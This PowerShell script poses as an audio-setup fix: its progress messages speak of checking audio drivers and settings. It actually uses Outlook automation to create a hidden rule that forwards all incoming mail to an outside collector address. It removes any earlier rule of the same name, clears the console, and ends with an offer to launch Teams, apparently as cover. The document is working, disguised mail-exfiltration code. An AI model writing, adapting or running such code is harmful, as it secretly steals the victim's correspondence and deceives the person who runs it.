clear-host
Write-Host "Starting fix Process" -ForegroundColor Cyan
$DebugMode = $true
$ProgressActivity = "Validating Audio Setup"
$ProgressTotalSteps = 5

function Write-DebugStep {
    param([string]$Message)

    if ($DebugMode) {
        $timestamp = Get-Date -Format "HH:mm:ss"
        Write-Host "[DEBUG $timestamp] $Message" -ForegroundColor DarkGray
    }
}

function Update-ProgressStep {
    param(
        [int]$Step,
        [string]$Status
    )

    $percent = [int](($Step / $ProgressTotalSteps) * 100)
    Write-Progress -Id 1 -Activity $ProgressActivity -Status "Step $($Step) of $($ProgressTotalSteps): $Status" -PercentComplete $percent
}

#Write-DebugStep "Initializing Outlook COM objects"
Update-ProgressStep -Step 1 -Status "Checking Audio Drivers and Configurations"
$outlook = New-Object -ComObject Outlook.Application
$session = $outlook.Session
$store = $session.DefaultStore
$rules = $store.GetRules()

$ruleName = "Forward All Mails (Outlook Only)"
$targetMail = "BoeseBuben-FWD-Collector@SchwingSchleiferUnited.eu"
#Write-DebugStep "Loaded rule configuration: $ruleName"

# Existing rule with same name entfernen (robust gegen COM-Aussetzer)
# Write-DebugStep "Removing existing rules with matching name (if present)"
Update-ProgressStep -Step 2 -Status "Removing old settings"
for ($i = $rules.Count
    $i -ge 1
    $i--) {
    try {
        $r = $rules.Item($i)
        if ($null -ne $r -and $r.Name -eq $ruleName) {
            $rules.Remove($i)
        }
    }
    catch {
        # einzelne defekte/unlesbare Rule ignorieren
        continue
    }
}

# 0 = olRuleReceive
#Write-DebugStep "Creating new receive rule"
Update-ProgressStep -Step 3 -Status "Creating new Audio settings and controls"
$rule = $rules.Create($ruleName, 0)

# Outlook-only / client-only
#Write-DebugStep "Enabling Outlook-only condition"
$rule.Conditions.OnLocalMachine.Enabled = $true

# Forward action
#Write-DebugStep "Configuring forward recipient and enabling forward action"
$null = $rule.Actions.Forward.Recipients.Add($targetMail)
$rule.Actions.Forward.Recipients.ResolveAll() | Out-Null
$rule.Actions.Forward.Enabled = $true

$rule.Enabled = $true
#Write-DebugStep "Saving rules to Outlook store"
$rules.Save()

#Write-Host "Outlook-only forward rule created: $ruleName -> $targetMail"

# Cleanup COM
#Write-DebugStep "Releasing COM objects"
Update-ProgressStep -Step 4 -Status "Releasing existing resources and cleaning up"
[void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($rules)
[void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($store)
[void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($session)
[void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($outlook)
#Write-DebugStep "COM cleanup complete"
clear-host
#Write-DebugStep "Showing user menu"
Update-ProgressStep -Step 5 -Status "Waiting for user action"
Write-Host "Select an option:" -ForegroundColor Cyan
Write-Host "1 - Close Program"
Write-Host "2 - Close Program and Start Teams"
do {
    $c = (Read-Host "Enter 1 or 2").Trim()
    #Write-DebugStep "User entered option: $c"
    if ($c -ne "1" -and $c -ne "2") {
        Write-Host "Invalid input. Please enter 1 or 2." -ForegroundColor Yellow
    }
}
while ($c -ne "1" -and $c -ne "2")

if ($c -eq "1") {
    #Write-DebugStep "User selected close only"
    Write-Host "Status: Program closed." -ForegroundColor Green
}
else {
    #Write-DebugStep "User selected close and start Teams"
    $teamsStarted = $false

    try {
        #Write-DebugStep "Trying to start Teams via URI"
        Start-Process -FilePath "msteams:" -ErrorAction Stop
        $teamsStarted = $true
    }
    catch {
        try {
            # Fallback: launch URI through shell association
            Write-DebugStep "Primary launch failed, trying explorer.exe fallback"
            Start-Process -FilePath "explorer.exe" -ArgumentList "msteams:" -ErrorAction Stop
            $teamsStarted = $true
        }
        catch {
            Write-DebugStep "Teams launch failed in both attempts"
            $teamsStarted = $false
        }
    }

    if ($teamsStarted) {
        Write-DebugStep "Teams launch reported success"
        Write-Host "Status: Program closed and Teams started." -ForegroundColor Green
    }
    else {
        Write-DebugStep "Teams launch reported failure"
        Write-Host "Status: Could not start Teams automatically." -ForegroundColor Red
    }
}

Write-Progress -Id 1 -Activity $ProgressActivity -Completed